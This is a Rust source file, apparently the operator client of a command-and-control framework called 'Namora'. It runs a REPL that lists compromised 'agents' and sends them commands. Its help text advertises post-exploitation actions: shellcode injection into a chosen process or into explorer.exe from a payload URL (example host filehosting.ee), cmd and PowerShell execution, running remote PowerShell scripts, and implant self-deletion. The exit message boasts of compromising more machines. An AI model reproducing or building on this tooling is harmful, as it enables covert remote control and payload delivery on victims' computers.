pub mod cli;
pub mod api;
mod error;
mod config;

use crate::{config::Config, error::Error};
use std::io::{self, Write};
use colored::*;
use rand::prelude::SliceRandom;
//use log::LevelFilter;
//use env_logger::Env;

fn banner() {
    let banner = r#"
    ███╗   ██╗ █████╗ ███╗   ███╗ ██████╗ ██████╗  █████╗ 
    ████╗  ██║██╔══██╗████╗ ████║██╔═══██╗██╔══██╗██╔══██╗
    ██╔██╗ ██║███████║██╔████╔██║██║   ██║██████╔╝███████║
    ██║╚██╗██║██╔══██║██║╚██╔╝██║██║   ██║██╔══██╗██╔══██║
    ██║ ╚████║██║  ██║██║ ╚═╝ ██║╚██████╔╝██║  ██║██║  ██║
    ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
    [**The Sand Puppy**]
    "#;
    
    println!("{}", banner);
}


fn commands_help() {
    println!("{}", "[*]post-exploitation commands to use with <exec>:".bright_purple());
    println!("{}", "   example1: exec <agent_id> novaldr 543 https://filehosting.ee/missile.bin [args...]");
    println!("{}", "   example2: exec <agent_id> cmd ipconfig /all");
    println!();
    println!("    {} - {}", "1.novaldr <pid> <payload_url>",   "inject staged shellcode into memory");
    println!("    {} - {}", "2.update                      ",  "check for updates !!not fully implemented yet!!");
    println!("    {} - {}", "3.selfdelete                  ",  "agents deletes itself if was running as EXE");
    println!("    {} - {}", "4.cmd <command> <args>         ", "execute command with cmd.exe");
    println!("    {} - {}", "5.powershell <command>         ", "execute powershell command");
    println!("    {} - {}", "6.powershell <URL to ps1 script> ","execute powershell staged script from URL");
    println!("    {} - {}",  "7.snapinject <payload url>                 ", "inject staged shellcode into explorer.exe");
    


}

//a function to get some jokes before hacking
fn jokes() {
    //create a vector of jokes
    let jokes = vec![
        "Why do programmers prefer dark mode? Because light attracts bugs.",
        "There are 10 types of people in the world: those who understand binary and those who don't.",
        "A SQL query walks into a bar, sees two tables and asks... 'Can I JOIN you?'",
        "Why do Java developers wear glasses? Because they don't C#.",
        "What's a programmer's favorite hangout spot? Foo Bar.",
        "!false - It's funny because it's true.",
        "Why was the math book sad? Because it had too many problems.",
        "What do you call a programmer from Finland? Nerdic.",
        "Why did the programmer quit his job? Because he didn't get arrays.",
        "What's a programmer's favorite snack? Cookies!",
        "Why do programmers always mix up Halloween and Christmas? Because Oct 31 == Dec 25.",
        "Why was the JavaScript developer sad? Because he didn't Node how to Express himself.",
        "['hip','hip'] - hip hip array!",
        "Why did the developer go broke? Because he used up all his cache.",
        "What did the Java Code say to the C code? You've got no class!",
        "Why do programmers hate nature? It has too many bugs.",
        "What did the programmer say to the rubber duck? You're the only one who understands me.",
        "Why don't programmers like to go outside? The sun causes too many reflections.",
        "How many programmers does it take to change a light bulb? None, that's a hardware problem.",
        "Why was the function sad after a party? It didn't get called.",
        "What's a penetration tester's favorite game? Break and Enter.",
        "Why are cybersecurity experts always calm? They use encryption to hide their emotions.",
        "Why did the hacker go broke? He used up all his cache.",
        "What's a hacker's favorite season? Phishing season.",
        "How do hackers greet each other? With a handshake protocol."
    ];

    //now we will print a random joke from the vector each time this function is called
    let random_joke = jokes.choose(&mut rand::thread_rng()).unwrap();
    println!("{}", random_joke.yellow());

    
}

fn main() -> Result<(), Error> {

    //env_logger::Builder::from_env(Env::default().default_filter_or("debug")).init();

    banner();
    let api_client = api::Client::new(config::SERVER_URL.to_string());

    loop {
        let mut input = String::new();
        println!("help - for available commands");
        print!("{}", "r00t@namora_v1> ".green().italic());
        io::stdout().flush().unwrap();
        io::stdin().read_line(&mut input).unwrap();

        let input = input.trim();
        if input.is_empty() {
            continue;
        }

        let parts: Vec<&str> = input.split_whitespace().collect();
        let command = parts[0];
        let args = &parts[1..];

        match command {
            "agents" => {
                cli::agents::run(&api_client)?;
                println!("Enter the agent ID to interact with:");
                let mut agent_id = String::new();
                io::stdin().read_line(&mut agent_id).unwrap();
                let agent_id = agent_id.trim().to_string();
        
                loop {
                    let mut agent_input = String::new();
                    print!("{}", format!("{}@namora_v1> ", agent_id).green().italic());
                    io::stdout().flush().unwrap();
                    io::stdin().read_line(&mut agent_input).unwrap();
        
                    let agent_input = agent_input.trim();
                    if agent_input.is_empty() {
                        continue;
                    }
        
                    let agent_parts: Vec<&str> = agent_input.split_whitespace().collect();
                    let agent_command = agent_parts[0];
                    let agent_args = &agent_parts[1..];
        
                    match agent_command {
                        "exec" => {
                            if agent_args.len() < 1 {
                                println!("{}", "Usage: exec <command> [args...]".yellow());
                                continue;
                            }
                            let command_with_args = if agent_args.len() > 1 {
                                format!("{} {}", agent_args[0], agent_args[1..].join(" "))
                            } else {
                                agent_args[0].to_string()
                            };
        
                            let conf = Config::load()?;
                            match cli::exec::run(&api_client, &agent_id, &command_with_args, conf) {
                                Ok(_) => println!("{}", "Command executed successfully".green()),
                                Err(e) => println!("{}: {}", "Error executing command!".bright_red(), e),
                            }
                        }
                        "back" => {
                            break;
                        }
                        "commands" => {
                            commands_help();
                        }
                        "help" => {
                            println!("{}", "Available commands:".bright_magenta().underline());
                            println!("  exec <cmd>           - Execute command on the agent");
                            println!("  back                 - Go back to the root prompt");
                            println!("  help                 - Show this help message");
                            println!("  commands             - Show available post-exploitation commands");
                        }
                        _ => {
                            println!("Unknown command: {}. Type 'help' for available commands.", agent_command);
                        }
                    }
                }
            }
            "identity" => {
                cli::identity::run();
            }
            "jokes" => {
                jokes();
            }
            "help" => {
                println!("{}", "Available commands:".bright_magenta().underline());
                println!("  agents               - List all agents & interact with one");
                println!("  identity             - create new identity");
                println!("  jokes                - Get a random programming joke");
                println!("  help                 - Show this help message");
                println!("  exit                 - Exit the client");
            }
            "exit" => {
                println!("{}", "Exiting...Come back to pawn more machines!!".bright_yellow());
                std::process::exit(0);
            }

            _ => {
                println!("Unknown command: {}. Type 'help' for available commands.", command);
            }
           
        }
    }
        
}
